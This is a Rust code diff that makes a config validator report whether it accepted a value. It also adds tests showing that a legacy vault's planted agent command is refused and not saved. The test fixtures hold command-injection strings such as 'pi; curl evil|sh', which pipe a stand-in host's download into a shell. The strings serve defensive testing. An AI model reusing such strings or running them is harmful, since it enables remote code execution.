@@ -265,8 +265,9 @@ impl Spec {
     /// Write `v` into `cfg` after sanitizing it for this spec's kind — the
     /// one gate every path (file load, settings window, reset) goes
     /// through, so a value that can't be reached by the UI can't be
-    /// reached by hand-editing either.
-    pub fn apply(&self, cfg: &mut Config, v: Value) {
+    /// reached by hand-editing either. Returns whether validation accepted
+    /// and applied the value.
+    pub fn apply(&self, cfg: &mut Config, v: Value) -> bool {
         let clean = match (&self.kind, v) {
             (Kind::Flag, Value::Flag(b)) => Value::Flag(b),
             (Kind::Num { min, max, .. }, Value::Num(n)) => {
@@ -280,19 +281,20 @@ impl Spec {
                 if (*options)(cfg).contains(&s) {
                     Value::Text(s)
                 } else {
-                    return; // keep whatever is there; never take an unlisted command
+                    return false; // keep whatever is there; never take an unlisted command
                 }
             }
             (Kind::Text { .. }, Value::Text(s)) => {
                 let s = s.trim();
                 if s.chars().any(char::is_control) || s.chars().count() > TEXT_MAX {
-                    return;
+                    return false;
                 }
                 Value::Text(s.to_string())
             }
-            _ => return, // kind/value mismatch — a caller bug, not user data
+            _ => return false, // kind/value mismatch — a caller bug, not user data
         };
         (self.set)(cfg, clean);
+        true
     }
 
     pub fn default_value(&self) -> Value {
@@ -590,8 +592,7 @@ pub fn migrate(c: &mut Config, vault: &Path) -> bool {
     if let Some(a) = vs.default_agent
         && let Some(s) = spec("default_agent")
     {
-        s.apply(c, Value::Text(a));
-        took = true;
+        took |= s.apply(c, Value::Text(a));
     }
     took
 }
@@ -737,9 +738,9 @@ mod tests {
     fn the_default_agent_must_be_allowlisted() {
         let mut c = Config::default();
         let s = spec("default_agent").unwrap();
-        s.apply(&mut c, Value::Text("pi; curl evil|sh".into()));
+        assert!(!s.apply(&mut c, Value::Text("pi; curl evil|sh".into())));
         assert_eq!(c.default_agent, "pi", "unlisted command refused");
-        s.apply(&mut c, Value::Text("claude".into()));
+        assert!(s.apply(&mut c, Value::Text("claude".into())));
         assert_eq!(c.default_agent, "claude");
         // extras widen the allowlist, exactly like $TEXT_GRAPH_AGENTS
         spec("extra_agents")
@@ -846,6 +847,37 @@ light
         assert!(migrate(&mut c, &d), "there was something to take");
         assert!(c.light, "the theme carries over");
         assert_eq!(c.default_agent, "pi", "the planted command does not");
+
+        // A rejected agent by itself is not a migration and must not create
+        // a user config that prevents a later vault's real preferences from
+        // being considered.
+        std::fs::write(
+            d.join(".text-graph/view"),
+            "text-graph view v1\nagent\tpi; curl evil | sh\n",
+        )
+        .unwrap();
+        let mut rejected = Config::default();
+        assert!(!migrate(&mut rejected, &d));
+        let config_path = d.join("user-config");
+        let loaded = load_or_migrate_from(Some(&config_path), &d);
+        assert_eq!(loaded.config, Config::default());
+        assert!(
+            !config_path.exists(),
+            "a rejected value must not create config"
+        );
+
+        // A valid legacy agent does count and is carried over.
+        std::fs::write(
+            d.join(".text-graph/view"),
+            "text-graph view v1\nagent\tclaude\n",
+        )
+        .unwrap();
+        let mut accepted = Config::default();
+        assert!(migrate(&mut accepted, &d));
+        assert_eq!(accepted.default_agent, "claude");
+        let loaded = load_or_migrate_from(Some(&config_path), &d);
+        assert_eq!(loaded.config.default_agent, "claude");
+        assert!(config_path.exists(), "an accepted value is persisted");
 
         // a vault that says nothing must not COUNT as a migration, or it
         // would stamp defaults over the config file and lock out the vault
